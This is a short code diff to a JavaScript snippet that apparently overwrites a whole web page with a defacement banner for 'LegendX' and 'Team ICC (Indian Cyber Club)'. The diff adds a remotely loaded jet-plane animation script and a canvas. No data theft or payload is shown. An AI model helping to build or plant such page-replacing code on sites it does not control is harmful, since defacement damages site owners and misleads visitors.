@@ -137,6 +137,21 @@ document.querySelector("html").innerHTML = `
     <h1>[•]&nbsp;&nbsp;LegendX&nbsp;&nbsp;[•]</h1>
     <h1>#Team ICC(<span style="color:red">Indian Cyber Club</span>)</h1>
   </div>
+<script>
+  const script = document.createElement("script");
+  script.src = "https://aakashbapna.github.io/jet-planes/doodle.js";
+  
+  // Wait until the script is fully loaded
+  script.onload = () => {
+    doodle.init("https://aakashbapna.github.io/jet-planes/jet.png");
+  };
+  
+  document.body.appendChild(script);
+</script>
 
+  <!-- Canvas -->
+  <canvas id="canvas_doodle" height="390" width="423" 
+          style="position: fixed; top: 0; left: 0; z-index: -1; pointer-events: none;">
+  </canvas>
 </body>
 `;
